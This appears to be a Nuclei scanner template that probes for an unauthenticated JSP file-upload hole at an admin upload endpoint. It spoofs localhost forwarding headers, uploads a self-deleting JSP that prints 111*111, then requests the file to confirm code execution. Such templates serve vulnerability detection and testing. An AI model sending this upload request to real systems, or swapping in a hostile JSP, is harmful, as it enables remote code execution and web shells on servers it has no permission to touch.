id: need_to_change

info:
  name: need_to_change
  author: msk
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        X-Forwarded-For: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        Content-Type: multipart/form-data; boundary=----{{boundary}}
        Content-Length: 153

        ------{{boundary}}
        Content-Disposition: form-data; name="file";filename="{{filename}}.jsp"

        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------{{boundary}}--

      - |
        GET {{url}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        X-Forwarded-For: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        Content-Type: multipart/form-data; boundary=----{{boundary}}
        Content-Length: 153

        ------{{boundary}}
        Content-Disposition: form-data; name="file";filename="{{filename}}.jsp"

        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------{{boundary}}--

    extractors:
      - type: json
        name: url
        part: body_1
        internal: true
        json:
          - .filePaths[0]


    matchers:
      - type: dsl
        dsl:
          - status_code_2==200 && contains_all(body,"12321")